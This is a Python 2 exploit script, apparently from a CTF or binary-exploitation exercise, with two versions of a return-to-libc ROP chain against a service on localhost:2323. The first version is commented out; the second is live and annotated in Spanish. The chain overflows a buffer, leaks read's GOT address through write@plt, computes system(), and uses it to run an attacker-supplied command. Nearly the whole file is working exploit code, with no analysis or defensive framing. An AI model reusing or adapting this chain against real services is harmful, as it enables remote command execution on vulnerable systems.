'''
import sys, socket
import struct
import telnetlib

cmd = sys.argv[1]+"\0"

s = socket.socket()
s.connect(("localhost",2323))

# all necceary address
read_plt = 0x0804832c
read_plt_got = 0x804961c
write_plt = 0x0804830c
read_sys = 0xd5b00
sys_libc = 0x3ada0
offset = read_sys + sys_libc
#system = 
ret_addr = 0x41414141
#ret_addr = 0x080484b6
dynamic = 0x08049530
payload = "A"*140

# this is leck real read addres libc
payload += struct.pack("<L", write_plt)
payload += struct.pack("<L", ret_addr)
payload += struct.pack("<L", 1)
payload += struct.pack("<L", read_plt_got)
payload += struct.pack("<L", 4)

# write stdin to dynamic using read@plt
payload += struct.pack("<L", read_plt)
payload += struct.pack("<L", ret_addr)
payload += struct.pack("<L", 0)
payload += struct.pack("<L", dynamic)
payload += struct.pack("<L", len(cmd))

# call read@plt to overwrite the ptr stored in read()

payload += struct.pack("<L", read_plt)
payload += struct.pack("<L", ret_addr)
payload += struct.pack("<L", 0)
payload += struct.pack("<L", read_plt_got)
payload += struct.pack("<L", 4)

payload += struct.pack("<L", read_plt)
payload += "EEEE"
payload += struct.pack("<L", dynamic)



print "(*) --------------------------------------------------"
print "(*) We send the first part of our exploit.."
s.send(payload+ cmd)
data = s.recv(4)
read_addr = struct.unpack('<L',data)[0]# this is as real read offset in libc
system = read_addr - offset
print("real read address: " , hex(read_addr))
print("real system address", hex(system))
s.send(struct.pack("<L", system))
print("(*) We send the second part of our exploit..")

#payload2 = "DDDD"
#payload2 = struct.pack("<L", system)
#payload2 += "EEEE"
#payload2 += struct.pack("<L", dynamic)

####
#s.send(payload2)
####
t = telnetlib.Telnet()
t.sock = s
t.interact()
print(s.recv(1024))
s.close()
'''
import sys
import struct
import socket
 
## Obtenemos el comando
command = sys.argv[1]
 
## Creamos el socket
s = socket.socket()
s.connect(("localhost", 2323))
 
## Declaramos las direcciones necesarias
read_plt = 0x0804832c
read_plt_point = 0x804961c
write_plt = 0x0804830c
offset = 0x8a530 # (read - system)
system = 0x0 # Por rellenar
 
ret_addr = 0x080484b6
dynamic = 0x08049530
pop_ebp = 0x080483c3 # POP EBP / RET
epilogue = 0x080482ea # LEAVE / RET
 
## Leemos la direccion real de la funcion read
sploit = "A" * 140
sploit += struct.pack("<L", write_plt) # Write plt address
sploit += struct.pack("<L", ret_addr) # Return address POP/POP/POP/RET
sploit += struct.pack("<L", 0x1) # Stdout
sploit += struct.pack("<L", read_plt_point) # Read GOT address
sploit += struct.pack("<L", 0x4) # Size
 
sploit += struct.pack("<L", read_plt) # Read plt address
sploit += struct.pack("<L", ret_addr) # Return address POP/POP/POP/RET
sploit += struct.pack("<L", 0x0) # Stdin
sploit += struct.pack("<L", dynamic) # Dest addr
sploit += struct.pack("<L", 0x30) # Size
 
sploit += struct.pack("<L", pop_ebp) # POP EBP / RET (Save dynamic address in EBP)
sploit += struct.pack("<L", dynamic) # dynamic address
sploit += struct.pack("<L", epilogue) # Now EBP in our new ESP
 
s.send(sploit)
 
print "(*) --------------------------------------------------"
print "(*) We send the first part of our exploit.."
data = s.recv(4)
 
## Calculamos la direccion real de la funcion read
read_addr = struct.unpack("<L", data)[0]
system = (read_addr - offset)
 
print "(*) Read real address: ", hex(read_addr)
print "(*) System real address: ", hex(system)
 
print "(*) We send the second part of our exploit.."
 
## Enviamos el comando mediante (read) y lo ejecutamos mediante (system)
sploit2 = struct.pack("<L", 0x58585858) # Padding for LEAVE
sploit2 += struct.pack("<L", system) # Call system address
sploit2 += struct.pack("<L", 0x58585858) # Fake return address
sploit2 += struct.pack("<L", dynamic+16) # Our command
 
s.send(sploit2 + command + "\x00")
 
print "(*) Result of: ", command
print "(*) --------------------------------------------------"
data = s.recv(1024)
print data
 
s.close()